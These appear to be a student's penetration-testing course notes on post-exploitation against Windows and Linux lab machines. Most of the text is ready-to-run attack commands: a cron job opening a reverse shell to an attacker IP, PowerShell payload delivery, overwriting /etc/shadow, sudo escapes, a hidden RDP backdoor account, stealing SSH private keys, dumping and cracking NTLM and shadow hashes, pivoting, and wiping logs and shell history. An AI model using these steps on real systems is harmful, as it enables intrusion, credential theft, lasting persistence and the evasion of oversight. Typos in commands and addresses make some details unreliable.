# Post Exploit Methodology
1. Local enum
2. Transfer files
3. Upgrading shells
4. Priv esc
5. Persistence
6. Dumping/cracking hashes (NTLM/unshadowed pwd)
7. Pivoting
8. Clearing Tracks
-> process repeats until whole network compromised

Note:
2 & 3 optional


# Windows Local Enum
- system info Eg
	- Hostname -> useful for user enum (sometimes named as user)
	- OS name/build/servicepack/architecture -> useful for priv esc
	- Installed updates
Demo:
`getuid`
`sysinfo`
`cd C:\\Windows\System32 && cat eula.txt` 
-> does not exist on every version of windows but gives info on build etc

On shell
`hostname`
`systeminfo` -->  gives info for hotfixes/patches
`wmic qfe get Caption,Description,HotFixID,Installation`
-> info about each specific hotfix (concerned with Security Update)

##### User and groups Enum

getuid
getprivs

/windows/gather/enum_logged_on_users

shell
`whoami`
`whoami /priv`
`query user` -> see if any other users logged on

`net users` -> all users on the system
`net user <username>` -> info about a user

`net users localgroup` -> groups on the system

`net localgroup <groupname>`  -> members in a group eg administrator

##### Enumerate network info
- internal network for pivoting
- firewall state for backdoor etc

shell
`ipconfig`
`ipconfig /all` -> see if DHCP enabled meaning the ip could change

`route print` -> list out the route table

`arp -a` 
-> arp table list other devices on the network
-> many with 225 and static are related to the subnet mask, not interesting

`netstat -ano`
-> display list of open ports/services running

`netsh firewall show state`
or
`netsh advfirewall firewall show allprofiles`
-> find if a specific port is blocked etc

#### Enum process and services
- process is a instance of running exe
- service is a process running in background (ie daemon on linux)

Demo:
In meterpreter sess
`ps`
`pgrep explorer.exe` -> usually most stable
`migrate <pid>` 
-> take note of privs for each process
-> architecture of ps can be diff too

shell
`net start`
-> list of **services** started (running in bg)
`wmic service list brief`
-> list services diff format
`tasklist /SVC`
-> list processes and associated services
-> lookout for lsass.exe and svchost.exe

`schtasks /query /fo LIST`
`schtasks /query /fo LIST v`
->list scheduled tassk and services also verbose
-> look for scheduled task run as NT/Authority system etc that are misconfiged

#### Automate windows local enum
- JAWS powershell script

Demo:
WinRM running on -p5985
/winrm/winrm_script_exec

meterpreter
`show_mount`
-> see if there are xternal harddrives etc on the target sys

/gather/win_privs
/windows/gather/enum_logged_on_users
/gather/checkvm  -> check if in a vm
/gatehr/enum/applications

/gather/enum_computers
-> find other systems connected to the network (pivoting etc)

/gather/enum_patches

/gather/enum_shares

#### JAWS
goto github copy raw and paste locally notepad etc

sidenote: to paste into lab env ctrl+shift+alt

Meterpreter
mkdir TEMP
cd TEMP
upload /root/Desktop/jaws-enum.ps1

shell
`powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
-> enumerate all the info and ouput into a txt file
-> takes very long just wait
`download JAWS-enum.txt`


# Linux Local Enum
- defualt package manager is aptitude package manager (apt)
- Get the exact distribution (for PE)
- kernel version (kernel exploit)
- architecture (what kind of payload can exec)

Interactive session
`/bin/bash -i`

sessions -u 1

Most is same as windows (sysinfo etc)

shell
`/bin/bash -i`
`hostname` -> could give info on usernames
`cat /etc/issue` -> issue version
`cat /etc/*release`  -> release version (also shows issue)
`uname -a` ->kernel versions
`env` -> env variables for the root user (eg PATH, PWD=/root)
`lscpu` -> hardware info

`free -h` 
-> the memory info (if the tool is installed)

`df -h`
`df -ht ext4`
`lsblk | grep sd`
--> hardrive info

`dpkg -l`
-> list installed packages see if vuln versions used (esp bash for PE)

### User group info
`getuid`
-> note uid number 0 is root and so on so forth

`groups root`
-> group a user (eg root) is in

`cat /etc/passwd`
-> user and service accts listed
-> to distinguish, 
see the dir configured for the 
user acct : /bin/bash or /bin/sh
service accts: /usr/sbin/nologin
--> the service accts is not set up to allow users to log into it / only used to manage a service (eg www-data for apache webserver)
-> sometimes even /bin/sync or /bin/false are service accts

Easy trick for only user accts(exclude nologin) :
`cat /etc/passwd | grep -v /nologin`

`root:x:0:0:root:/root:/bin/bash`
`<username> :x:< userid> : <grpid> :root: <homedir> : <shell>`

`ls /home` should ahve the other user accts

Add user
`useradd -m bob -s /bin/bash`
`ls -al /home` -> bob shud be added to the home dir

See groups
`groups`
`usermod -aG root bob` -> add bob to root group

`last` -> see last user logged on (only legitimate logons tru ssh or physical TTY session)
`lastlog` -> list all users prev logged on

#### Enum linux network info

`ifconfig`
interface1 lo loopback interface 127.0.0.1 for local services 
....etc etc
interface 6180 eth0 -> the interface connected to our subnet

`netstat`
-> services running and ports

`route` 
-> route table
-> look for the gateway (could be router or some DHCP server etc)

/bin/bash -i
`ip a s`  -> use if ifcofig not available for that distrib
`cat /etc/networks`
`cat /etc/hostname`
`cat /etc/hosts` -> find new subdomains etc
`cat /etc/resolv.conf` -> checks the dns server used

In meterpreter (if arp not available in bash)
`arp`


#### Enum ps and cronjobs
`ps`
`pgrep <ps name>`
`ps aux`
`top` -> util that lists al running processes 

`crontab -l`
-> list of cronjobs
`ls -al /etc/cron*`
`cat /etc/cron*`

#### Automate local enum

Demo:
vuln
/http/apache_mod_cgi_bash_env_exec
set RPATH /gettime.cgi  --> found from the source code

/gather/enum_configs
set session, run
`cat <loot dir>`
`loot`

/gather/enum_network
/gather/enum_system
/gather/checkvm

script LinEnum can be used
- upload onto the system 
- chmod +x linenum.sh
- ./linenum.sh
Similar to linpeas but less for priv esc


# Filetransfers
- use meterpreter upload download
- Else,
Simple GET and HEAD request handlers (if need POST find a script online)

python2
`python -m SimpleHTTPServer 80`
python3
`python3 -m http.server 80`

On the target
`curl http://<ip>/<filename> <ouputname>`  -> similar to just accesing the browser
`wget http://<ip>/<filename> `
`certutil -url cache -f http://<ip>/<filename> <outputfilename>` -> for windows

- Set up the server where it is needed 
eg 
/usr/share/windows/binaries  -> where nc.exe is stored
/usr/share/windows-resources/mimikatz/x64  -> post exploit to dump hashes


#### tmux
- multiple terminals in 1 terminal
`tmux`
- Open new terminal from 0 to anyamt
ctrl + B and C
ctrl+B and 0 to go back to terminal 0

astrisk at bottom shows the current terminal
Must use ctrl+B and arrow keys to scroll
hit q when done scrolling

# Upgrade non-interactive shells
- pertinent to linux
Assuming bash is installed on the system
/bin/bash -i

`cat /etc/shells`
bin/sh -i

Use python to start bash if it exists
`python --version`
`python -c 'import pty; pty.spawn("/bin/bash")'`

If perl installed
`perl: exec "/bin/bash";`

Ruby
`ruby: exec "/bin/bash"`


# Windows PE
- target the system
Tools
PrivescCheck (similar to winpeas)

Demo:
/script/web_delivery
-> generates powershell code that execs on the system downloading the payload
-> execs the payload giving a reverse shell
`set target PSH`
`set target PSH\ (Binary)`
`set payload windows/shell/reverse_tcp`
`set PSH-EncodedCommand FALSE`

copy the powershell code generated

go to target system. Paste and execute.
Session is created on msfconsole

/manage/shell_to_meterpreter
set LHOST
set LPORT (different from session 1)
set SESSION
`show advanced`
`set WIN_TRANSFER VBS` 

Meterpreter session spawns
#### Running PrivescCheck
follow the github instructions

`powershell -ep bypass .\script.ps1`

Script found unencrypted WinLogon registry keys 
Contains clear-text password

`psexec.py Administrator@<ip>`
or
/windows/smb/psexec

Or any other service available (eg WinRM RDP)

# Linux PE

- Find misconfigured files
- Automated enum scirpts

`cat /etc/passwd`
`cat /etc/group`

`groups <user>`

`find / -not -type l -perm -o+w`
-> find from root (essentially searching all dirs)
-> files with permission type o w (read and write by evryone)

Demo:
/etc/shadow files can be written/read
`ls -al /etc/shadow`
-rw-rw-rw-

Generate a new passwd 
`openssl passwd -1 -salt abc password`
-> format type is passwd
-> hashing algo 1 (MD5)
-> salt the password with abc

original (root had no password lol)
`root:*:17764:0:99999:7:::`
Vim updated
`root:$1$abc$BXBqbsdfwheiuhihsdf.0s/:17764:0:99999:7:::`

Switch to admin
`su`
Enter the password changed to

#### Exploit sudo privs
`sudo -l`
-> list of commands the user can run

Demo:
here /usr/bin/man can be run as root with NOPASSWD
`man ls` -> normal use to see manual for ls command
`sudo man ls`
but since man is run with sudo privs
Enter into the terminal within the man session
`!/bin/bash`

root is spawned.

# Windows Persistence
- hashdump is best leaves the least trace
- other methods depends on rules of engagement (eg create new users/change auths)
- MITRE ATT&CK has alot of examples for PE methods


Demo:
rejetto exploit 

If elevated priveledges obtained,
/local/persistence_service
set session 1
set LPORT
-> creates a service that tries reconnecting every 5secs

for demo, Kill all previous sessions (the persistence service is running is the bg of the server)

/multi/handler
set payload /windows/meterpreter/reverse_tcp
set LHOST
set LPORT

Even if rejetto is patch persistence gotten (as long as the service isnt stopped)


#### Persistence via RDP
- new user is created here so careful

Demo:
badblue exploit
meterpreter after gaining access:
`run getgui -e -u alexis -p hacker_123321`

-> getgui enables/check if RDP and enables it
-> creates a new user also with password
-> hides user from the login screen and add user to RDP user group and local administrators group

RDP from outside
`xfreerdp /u:alexis /p:hacker_123321 /v:10.2.18.93`

# Linux persistence

#### SSH keys
- usually configured foir public facing linux servers
- can use private key instead of user/pass
- transfer the private key over (even if passwords changed, still can access)
- sometimes keys are found at other places

Demo:
SSH in (simulating gaining the foothold)
At the users dir ~
`ls -al `
There is a .ssh folder contains:
authorized_keys     id_rsa

On the attacker
`scp student@<ip>:~/.ssh/id_rsa .`
-> copy via ssh into the current dir
`chmod 400 id_rsa`   -> give private key permissions

Even when user changed password
`ssh -i id_rsa student@<ip>`

Another way is generate a private key pair,
Transfer the public key to the target and add your private key as authorised_keys

#### Persistence via cronjobs
- scheduled tasks (daily/monthly etc)
- `*` represent the period to run at ( * * * * * Means run everyday/month/hour/) 

`cat /etc/cron`
`cat /etc/cron*`

- create cronjob and add to crontab
`echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/1234 0>&1'" > cron

`crontab -i cron`
`crontab -l`

`nc -lvnp 1234`
`
# Hash cracking
## Windows cracking
NTLM

SAM database (like the /etc/shadow)
- but cannot be accessed while the OS sytem is running
- msut be dumped from LSASS cache

Demo:
meterpreter
`pgrrep lsass`
`migrate <lsass pid>`

`hashdump`
copy and paste the hashes  `vim hashes.txt`

#### Johntheripper
List out cracking formats supported by john and grep NTLM
`john --list=formats | grep NT`

`john --format=NT hashes.txt`

with wordlists
`gzip -d /usr/share/wordlists/rockyou.txt.gz`
`john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`

#### Hashcat
hashcat --help

`hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
`-m <hash id>` NTLM 1000
`-a3 `bruteforce attack type

## Linux cracking
- Account details stored in /etc/passwd
- Account passwords stored in /etc/shadow
-> only admin can read and access shadow

Demo:

/linux/gather/hashdump
set session
cat out the unshadowed file
the unshadowed file can be cracked directly

Impt: Note the hashing algo used `$6$` is sha512 etc

`john --format=sha512crypt <unshadowed file dir> --wordlist=/usr/share/wordlists/rockyou.txt` `

`hashcat -a3 -m 1800 <unshadowed hash dir> /usr/share/wordlists/rockyou.txt`


# Pivoting

- moving between systems within an internal network
- Also find other networks it is connected to `ifconfig/ipconfig`

Port forwarding
- redirect traffic from a port on the target system to a port on our system
for pivoting, redirect a remote port on a previously inaccessible system to our local port so we can interact with the service running on that port.

Demo:
Attacker, Target 1 and Target 2 are all on the same network
but attacker cant access services on target 2

SO
Route must be added to allow us to access target2 from target1 from the msfconsole

target1
10.0.29.148
225.225.240.0

add the subnet to the route
`run autoroute -s 10.0.29.0/20`
`run autoroute -p`

/portscan/tcp

Need to forward the open port to our attacker

Meterpreter target1
`portfwd add -l 1234 -p 80 -r <target2 ip>
-> port 80 on remote target2 to local port 1234`

`nmap -sV -p 1234 localhost`
/badblue_passthru
set payload windows/meterpreter/bind_tcp
set rhosts target2

# Clearing tracks
- easily store everthing to /temp or /tmp
- msfmodules something cant delete artifacts (path is provided to delete manually)


#### Windows
- store in /temp
msfmodules
show advanced for more info.

after using /persistence_service
dir for where the service is running 
resource script is also given to clear everything 
`resource <resource script path>`

`clearenv`
clears the wholew indows event log (not recomended as all logs are gone)

#### Linux
- store in /tmp
- .bash_history files stores all the commands put. Delete them if needed (some seervers configured to not save)
`history -c`


`cat /dev/null > .bash_history`



ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰